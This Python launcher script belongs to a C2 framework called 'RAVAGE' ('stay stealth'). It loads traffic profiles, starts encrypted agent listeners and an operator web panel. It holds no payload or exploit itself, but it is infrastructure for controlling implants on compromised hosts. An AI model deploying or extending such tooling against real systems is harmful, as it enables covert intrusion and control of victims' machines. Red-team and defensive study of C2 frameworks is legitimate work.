#!/usr/bin/env python3
"""
C2 Server
C2 Server with modular architecture and dynamic configuration + Agent Delivery + SSL Support
"""

import os
import sys
import threading
from config.config_loader import ConfigLoader
from database.models import init_database
from database.operations import AgentDatabase
from servers.admin_server import AdminServer
from servers.listener_manager import ListenerManager
from utils.logger import EventLogger
from crypto.aes_cipher import initialize_cipher_from_config

VERSION = "1.1"

def print_banner():
    banner = r"""
        ▄▄▄   ▄▄▄·  ▌ ▐· ▄▄▄·  ▄▄ • ▄▄▄ .
        ▀▄ █·▐█ ▀█ ▪█·█▌▐█ ▀█ ▐█ ▀ ▪▀▄.▀·
        ▐▀▀▄ ▄█▀▀█ ▐█▐█•▄█▀▀█ ▄█ ▀█▄▐▀▀▪▄
        ▐█•█▌▐█ ▪▐▌ ███ ▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌
        .▀  ▀ ▀  ▀ . ▀   ▀  ▀ ·▀▀▀▀  ▀▀▀
           Framework 1.1 | stay stealth
"""
    print(banner)

def main():
    print_banner()

    # Inicializar logger e estrutura de diretórios
    logger = EventLogger()
    profiles_dir = 'profiles'
    os.makedirs(profiles_dir, exist_ok=True)

    # Carregar configurações
    config_loader = ConfigLoader()
    if not config_loader.load_config():
        print("\033[91m[ERROR]\033[0m Could not load configuration!")
        print("Check if the file profiles/profile.yaml exists and is correct.")
        sys.exit(1)

    config = config_loader.get_config()

    # Configurações do servidor de administração
    teamserver = config.get('teamserver', {})
    bind_config = teamserver.get('bind', {})
    admin_port = bind_config.get('port', 6001)
    admin_host = bind_config.get('host', '0.0.0.0')
    response_headers = bind_config.get('response_headers', [])

    # Configurações SSL
    ssl_config = config_loader.get_global_ssl_config()
    ssl_enabled = ssl_config.get('enabled', False)

    # Inicializar componentes
    initialize_cipher_from_config(config_loader)
    init_database()

    # Registrar eventos iniciais
    logger.log_event("SERVER - RAVAGE started successfully")
    logger.log_event(f"SSL - Global SSL/TLS {'enabled' if ssl_enabled else 'disabled'} for both servers")

    operators_count = len(config.get('operators', []))
    logger.log_event(f"CONFIG - {operators_count} operators loaded")
    logger.log_event(f"HEADERS - {len(response_headers)} admin headers configured")

    # Log de profiles de tráfego
    profiles = config_loader.get_profiles()
    logger.log_event(f"PROFILES - {len(profiles)} traffic profile(s) loaded from profile.yaml")

    # Inicializar banco de dados e listener manager
    db = AgentDatabase()
    listener_manager = ListenerManager(config_loader, logger, db)

    # Iniciar C2 servers para cada listener salvo no banco
    started = listener_manager.start_all_from_db()
    if started > 0:
        logger.log_event(f"LISTENERS - {started} listener(s) started from database")
    else:
        logger.log_event("LISTENERS - No active listeners found in database. Create one via the web panel.")

    # Protocolo dinâmico para admin
    protocol = "https" if ssl_enabled else "http"
    admin_url = f"{protocol}://{admin_host}:{admin_port}/"

    # Iniciar servidor de administração
    admin_server = AdminServer(config_loader, logger, listener_manager)

    print(f"\033[92m[+]\033[0m Team server started on {admin_url} <= Log in with your operator credentials")
    print(f"\033[92m[+]\033[0m {started} C2 listener(s) running | Create more from the web panel")
    print("")

    # Iniciar servidor de administração (bloqueante)
    admin_server.run(admin_host, admin_port)

if __name__ == "__main__":
    main()
